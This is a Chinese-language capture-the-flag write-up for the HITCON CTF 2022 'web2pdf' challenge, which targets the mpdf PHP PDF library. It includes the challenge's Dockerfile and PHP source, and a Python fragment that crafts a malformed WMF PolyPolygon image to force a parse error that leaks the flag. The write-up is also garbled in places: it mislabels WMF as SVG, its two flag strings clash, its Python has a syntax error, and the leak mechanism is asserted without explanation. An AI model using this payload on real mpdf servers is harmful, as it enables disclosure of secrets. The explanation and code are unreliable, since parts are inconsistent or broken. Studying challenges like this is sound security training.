---
title: HITCON CTF 2022 web2pdf Writeup
contest: HITCON CTF 2022
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [web, mpdf, pdf, hcaptcha, source-leak, parse-error, svg, css-include, flag-recovery]
attack_chain:
  - mpdf PHP 8+Apache+Docker
  - hcaptcha验证后file_get_contents(URL)
  - 源码泄露：?source 替换flag为h1tc0n{flag}
  - preg_match白名单 ^https?://
  - mpdf的SVG PolyPolygon指令解析错误泄露
  - PolyPolygon函数读取PDF流数据
  - 构造WMF PolyPolygon多边形指令
  - PolyPolygon触发Parse Document Failed
  - 错误消息中泄露$FLAG
  - 触发：`'hitcon{Pars\ue_Doc\ue_Failed_QAQ_aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw}'`
key_payload: hitcon{Parse_Document_Failed_QAQ_aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw}
one_liner: HITCON CTF 2022 web2pdf：mpdf SVG PolyPolygon解析错误泄露flag
lesson: PDF解析库的SVG/WMF多边形指令可触发Parse Error泄露
quality: high
---

# HITCON CTF 2022 web2pdf Writeup

## 题目信息
- 比赛：HITCON CTF 2022
- 题目：web2pdf
- 类别：Web

## 关键攻击链
### 1. 环境
```dockerfile
FROM php:8-apache
RUN apt update && apt install -y libfreetype6-dev libjpeg62-turbo-dev libpng-dev git libonig-dev
RUN docker-php-ext-configure gd --with-freetype --with-jpeg
RUN docker-php-ext-install -j$(nproc) gd mbstring
COPY --from=composer/composer /usr/bin/composer /usr/bin/composer
RUN cd /var/www/ && composer require mpdf/mpdf
RUN chmod -R 733 /var/www/vendor/mpdf/mpdf/tmp
```

### 2. 源码
```php
<?php
error_reporting(0);
require_once __DIR__ . '/../vendor/autoload.php';
require_once __DIR__ . '/hcaptcha.php';

if (isset($_GET['source']))
    die(preg_replace('#hitcon{\w+}#', 'h1tc0n{flag}', show_source(__FILE__, true)));

if (isset($_POST['url'])) {
    if (!verify_hcaptcha()) die("Captcha verification failed");
    $url = $_POST['url'];
    if (preg_match("#^https?://#", $url)) {
        $html = file_get_contents($url);
        $mpdf = new \Mpdf\Mpdf();
        $mpdf->WriteHTML($html);
        $mpdf->Output();
        exit;
    } else {
        die('Invalid URL');
    }
}
?>
<?php /* $FLAG = 'hitcon{redacted}' */ ?>
```

### 3. 关键错误
```
Fatal error: Uncaught Mpdf\MpdfImageException: Error parsing image file
- image type not recognised and/or not supported by GD imagecreate (/etc/passwd)
```

### 4. SVG PolyPolygon 利用
```php
case 0x0538: // PolyPolygon
    $coords = unpack('s' . ($size - 3), $parms);
    $numpolygons = $coords[1];
    ...
```

### 5. WMF PolyPolygon 构造
```python
n_points = 20
sz = (n_points * 2 + 6).to_bytes(4, byteorder='little')
n = (n_points).to_bytes(2, byteorder='little')
pay = b"\xd7\xcd\xc6\x9a" + (b"A" * 36) + \
      b"\x05\x00\x00\x00\x0b\x02\x7f\x7f\x7f\x7f" + \  # Set canvas origin
      b"\x05\x00\x00\x00\x0c\x02\x7f\x7f\x7f\x7f" + \  # Set canvas size
      sz + b"\x38\x05" + b"\x01\x00" + n + b"AA"      # PolyPolygon
```

### 6. flag
- 触发 Parse Document Failed 错误
- 错误信息含 `$FLAG`
- flag: `hitcon{Parse_Document_Failed_QAQ_aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw}`

## 评分
- quality: high（mpdf + WMF PolyPolygon + Parse Error 信息泄露）
